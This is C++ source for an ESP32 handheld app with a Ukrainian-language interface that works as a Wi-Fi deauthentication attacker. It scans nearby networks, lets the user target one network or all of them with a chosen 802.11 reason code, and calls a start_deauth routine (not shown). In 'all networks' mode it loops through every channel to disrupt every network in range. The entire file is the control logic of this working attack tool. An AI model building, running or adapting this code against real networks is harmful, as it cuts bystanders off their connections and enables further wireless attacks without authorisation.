#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauthapp.h"
#include "definitions.h"
#include "deauth.h"

deauthapp::deauthapp() : App("Деаунтифікатор") {
}
bool exitstate = false;
int curr_channel = 1;
int num_networks;
void deauthapp::controlmenu() {
    canvas->fillScreen(canvas->color565(0, 0, 0));
    canvas->setCursor(25,45);
    canvas->print("Скануємо мережі.");
    queueDraw();
    num_networks = WiFi.scanNetworks(); 
    lilka::Menu wifilist("Оберіть мережу:");
    wifilist.addActivationButton(lilka::Button::B);
    wifilist.addItem("Усі мережі");         
    for (int i = 0; i < num_networks; i++) {
      wifilist.addItem(WiFi.SSID(i));         
    }

    while (!wifilist.isFinished()) {
      wifilist.update();
      wifilist.draw(canvas);
      queueDraw();
    }
    if (wifilist.getButton() == lilka::Button::B) {
      exitstate = true;
      return;

    }
    int index = wifilist.getCursor();
    int wifinum = index - 1;
  
    lilka::Menu reason("Оберіть причину:");
    reason.addItem("Reserved.");
    reason.addItem("Unspecified reason.");
    reason.addItem("Previous authentication no longer valid.");
    reason.addItem("Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.");
    reason.addItem("Disassociated due to inactivity.");
    reason.addItem("Disassociated because WAP device is unable to handle all currently associated STAs.");
    reason.addItem("Class 2 frame received from nonauthenticated STA.");
    reason.addItem("Class 3 frame received from nonassociated STA.");
    reason.addItem("Disassociated because sending STA is leaving or has left Basic Service Set (BSS).");
    reason.addItem("STA requesting (re)association is not authenticated with responding STA.");
    reason.addItem("Disassociated because the information in the Power Capability element is unacceptable.");
    reason.addItem("Disassociated because the information in the Supported Channels element is unacceptable.");
    reason.addItem("Disassociated due to BSS Transition Management.");
    reason.addItem("Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.");
    reason.addItem("Message integrity code (MIC) failure.");
    reason.addItem("4-Way Handshake timeout.");
    reason.addItem("Group Key Handshake timeout.");
    reason.addItem("Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.");
    reason.addItem("Invalid group cipher.");
    reason.addItem("Invalid pairwise cipher.");
    reason.addItem("Invalid AKMP.");
    reason.addItem("Unsupported RSNE version.");
    reason.addItem("Invalid RSNE capabilities.");
    reason.addItem("IEEE 802.1X authentication failed.");
    reason.addItem("Cipher suite rejected because of the security policy.");
    while (!reason.isFinished()) {
      reason.update();
      reason.draw(canvas);
      queueDraw();
    }
    int reasonnum = reason.getCursor();
    lilka::MenuItem item;
    if (index == 0) {
      canvas->fillScreen(canvas->color565(0, 0, 0));
      canvas->setCursor(25,45);
      canvas->print("Деаунтифікація усіх мереж.");
      canvas->setCursor(25,75);
      canvas->print("B - Вихід з програми.");
      queueDraw();
      start_deauth(0, DEAUTH_TYPE_ALL, reasonnum);
      
    } else {

      canvas->fillScreen(canvas->color565(0, 0, 0));
      canvas->setCursor(25,45);
      canvas->print("Деаунтифікація ");
      canvas->setCursor(25,60);
      canvas->print(WiFi.SSID(wifinum));
      canvas->setCursor(25,75);
      canvas->print("A - Вибір іншої мережі.");
      canvas->setCursor(25,90);
      canvas->print("B - Вихід з програми.");
      queueDraw();
      start_deauth(wifinum, DEAUTH_TYPE_SINGLE, reasonnum);
    }
  
  }
void deauthapp::run() { 
  deauthapp::controlmenu();
    while (true) { 
        if (exitstate) {
          exitstate = false;
          return;
        }
        lilka::State state = lilka::controller.getState();
        if (state.a.justPressed) {
          stop_deauth();
          deauthapp::controlmenu();
        } 
        if (state.b.justPressed) {
          return;
        } 
        
        if (deauth_type == DEAUTH_TYPE_ALL) {
          if (curr_channel > CHANNEL_MAX) curr_channel = 1;
          esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
          curr_channel++;
          delay(1);
      
        }
    }
}